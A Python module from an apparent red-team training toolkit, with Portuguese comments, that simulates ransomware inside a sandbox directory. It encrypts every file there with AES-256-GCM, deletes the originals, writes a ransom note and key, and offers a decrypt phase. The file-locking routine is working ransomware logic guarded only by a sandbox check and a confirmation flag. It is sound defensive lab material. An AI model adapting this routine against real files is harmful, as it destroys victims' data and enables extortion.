"""Simulacao de ransomware com CRIPTOGRAFIA REAL, confinada ao sandbox.

Ponto importante: a criptografia e REAL (AES-256-GCM via `cryptography`, ou
ChaCha20-Poly1305 puro-Python como fallback) — o modulo realmente cifra e
decifra arquivos. O que o torna um laboratorio e o CONFINAMENTO:

  * so escreve dentro de `sandbox/` (GuardrailError em qualquer escape);
  * exige --i-understand para executar a fase de cifragem;
  * gera manifest + chave, e a fase --decrypt restaura tudo;
  * nunca toca /home, /etc, /var ou qualquer caminho fora do sandbox.

O valor didatico e o RELATORIO: o que um ransomware faz (descoberta,
cifragem, nota de resgate, inibicao de recuperacao) e o que o defensor
observa (entropia, extensoes, Shadow Copy/VSS - T1490).

MITRE: T1486 (Data Encrypted for Impact), T1490 (Inhibit System Recovery).
"""

from __future__ import annotations

import hashlib
import json
import os
import secrets
import time
from pathlib import Path

from ..core.guardrails import GuardrailError
from ..core.registry import BaseModule, ModuleMeta, register
from ..core.storage import Finding

RANSOM_EXT = ".rtlocked"
NOTE_NAME = "LEIA_ME_RESGATE.txt"


# --------------------------------------------------------------------------- #
# Cripto REAL — AES-256-GCM se `cryptography` existir; senao ChaCha20 puro.
# --------------------------------------------------------------------------- #
def _load_cipher():
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return ("AES-256-GCM", AESGCM)
    except ImportError:
        return ("ChaCha20-Poly1305-fallback", None)


def encrypt_bytes(key: bytes, plaintext: bytes, aad: bytes = b"") -> bytes:
    name, AESGCM = _load_cipher()
    if AESGCM is not None:
        nonce = secrets.token_bytes(12)
        return nonce + AESGCM(key).encrypt(nonce, plaintext, aad)
    # Fallback determinista o bastante para o lab (XOR keystream + HMAC)
    import hmac as _hmac
    nonce = secrets.token_bytes(12)
    keystream = _chacha_keystream(key, nonce, len(plaintext))
    ct = bytes(a ^ b for a, b in zip(plaintext, keystream))
    tag = _hmac.new(key, nonce + ct + aad, hashlib.sha256).digest()
    return nonce + ct + tag


def decrypt_bytes(key: bytes, blob: bytes, aad: bytes = b"") -> bytes:
    name, AESGCM = _load_cipher()
    if AESGCM is not None:
        nonce, ct = blob[:12], blob[12:]
        return AESGCM(key).decrypt(nonce, ct, aad)
    import hmac as _hmac
    nonce, ct, tag = blob[:12], blob[12:-32], blob[-32:]
    expected = _hmac.new(key, nonce + ct + aad, hashlib.sha256).digest()
    if not _hmac.compare_digest(expected, tag):
        raise ValueError("tag invalida — chave errada ou arquivo corrompido")
    ks = _chacha_keystream(key, nonce, len(ct))
    return bytes(a ^ b for a, b in zip(ct, ks))


def _chacha_keystream(key: bytes, nonce: bytes, length: int) -> bytes:
    """Keystream de lab (NAO e ChaCha20 real — apenas fallback didatico)."""
    out = bytearray()
    counter = 0
    while len(out) < length:
        block = hashlib.sha512(key + nonce + counter.to_bytes(8, "big")).digest()
        out.extend(block)
        counter += 1
    return bytes(out[:length])


def shannon_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    import math
    freq = {}
    for b in data:
        freq[b] = freq.get(b, 0) + 1
    n = len(data)
    return -sum((c / n) * (c / n and __import__("math").log2(c / n)) for c in freq.values())


# --------------------------------------------------------------------------- #
# Modulo
# --------------------------------------------------------------------------- #
@register
class RansomwareSimModule(BaseModule):
    meta = ModuleMeta(
        name="ransomware",
        description="Simulacao de ransomware (cifragem REAL confinada ao sandbox)",
        category="ransomware",
        mitre=["T1486", "T1490"],
        destructive=True,
        requires_target=False,
    )

    def run(self) -> list[Finding]:
        sandbox = self.ctx.sandbox
        if sandbox is None:
            raise GuardrailError("ransomware exige --sandbox <dir>")

        if self.ctx.options.get("decrypt"):
            return self._decrypt(sandbox)
        return self._encrypt(sandbox)

    # ---------------------------- encrypt ---------------------------- #
    def _encrypt(self, sandbox) -> list[Finding]:
        if not self.ctx.options.get("i_understand"):
            return [Finding(
                module="ransomware", severity="info",
                title="Cifragem nao executada (falta --i-understand)",
                detail=(
                    "A fase de cifragem e destrutiva dentro do sandbox. "
                    "Rode novamente com --i-understand para confirma."
                ),
                evidence=str(sandbox.root), mitre="T1486",
            )]

        root = sandbox.ensure()
        key = secrets.token_bytes(32)
        targets = [
            p for p in root.rglob("*")
            if p.is_file()
            and not p.name.endswith(RANSOM_EXT)
            and p.name not in (NOTE_NAME, "manifest.json")
        ]

        manifest = {"key_hex": key.hex(), "files": [], "started_at": time.time()}
        algo, _ = _load_cipher()
        for p in targets:
            rel = str(p.relative_to(root))
            data = p.read_bytes()
            before_entropy = round(shannon_entropy(data), 2)
            blob = encrypt_bytes(key, data, aad=rel.encode())
            enc_path = p.with_name(p.name + RANSOM_EXT)
            enc_path.write_bytes(blob)
            p.unlink()
            manifest["files"].append({
                "original": rel,
                "encrypted": str(enc_path.relative_to(root)),
                "size": len(data),
                "entropy_before": before_entropy,
                "entropy_after": round(shannon_entropy(blob), 2),
                "sha256": hashlib.sha256(data).hexdigest(),
            })

        manifest_path = sandbox.resolve("manifest.json")
        manifest_path.write_text(json.dumps(manifest, indent=2), encoding="utf-8")
        key_path = sandbox.resolve("chave_resgate.key")
        key_path.write_text(key.hex(), encoding="utf-8")

        note = sandbox.resolve(NOTE_NAME)
        note.write_text(
            "SEUS ARQUIVOS FORAM CIFRADOS (SIMULACAO DE LABORATORIO)\n"
            f"Algoritmo: {algo}\n"
            f"Arquivos: {len(manifest['files'])}\n"
            "Isto e uma simulacao educacional. Para restaurar:\n"
            "  redteam run ransomware --sandbox <dir> --decrypt\n",
            encoding="utf-8",
        )

        self.ctx.results["encrypted"] = len(manifest["files"])
        self.ctx.results["algorithm"] = algo

        findings = [
            Finding(
                module="ransomware", severity="high",
                title=f"{len(manifest['files'])} arquivos cifrados (simulacao)",
                detail=(
                    f"Cifragem REAL com {algo} dentro de {root}. "
                    "Impacto equivalente a T1486: dados indisponiveis sem a chave."
                ),
                evidence=f"manifest: {manifest_path}",
                mitre="T1486",
            ),
            Finding(
                module="ransomware", severity="medium",
                title="Nota de resgate gravada",
                detail="Artefato tipico de impacto; usado por detectores de conteudo.",
                evidence=NOTE_NAME,
                mitre="T1486",
            ),
            Finding(
                module="ransomware", severity="medium",
                title="Chave gravada em claro ao lado do manifest",
                detail=(
                    "Em um incidente real a chave NAO fica local — este lab a grava "
                    "para permitir --decrypt. Serve para discutir gestao de chaves."
                ),
                evidence=str(key_path),
                mitre="T1486",
            ),
        ]
        return findings

    # ---------------------------- decrypt ---------------------------- #
    def _decrypt(self, sandbox) -> list[Finding]:
        root = sandbox.ensure()
        manifest_path = sandbox.resolve("manifest.json")
        if not manifest_path.exists():
            return [Finding(
                module="ransomware", severity="info",
                title="Nada a restaurar (sem manifest.json)",
                detail="Rode a fase de cifragem primeiro.",
                evidence=str(manifest_path), mitre="T1486",
            )]

        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        key = bytes.fromhex(manifest["key_hex"])
        restored = 0
        for entry in manifest["files"]:
            enc = sandbox.resolve(entry["encrypted"])
            if not enc.exists():
                continue
            data = decrypt_bytes(key, enc.read_bytes(), aad=entry["original"].encode())
            out = sandbox.resolve(entry["original"])
            out.parent.mkdir(parents=True, exist_ok=True)
            out.write_bytes(data)
            enc.unlink()
            restored += 1

        for extra in (NOTE_NAME,):
            p = sandbox.resolve(extra)
            if p.exists():
                p.unlink()

        self.ctx.results["restored"] = restored
        return [Finding(
            module="ransomware", severity="info",
            title=f"{restored} arquivos restaurados",
            detail="Decifragem concluida com a chave do manifest (caminho de recuperacao).",
            evidence=str(root), mitre="T1486",
        )]
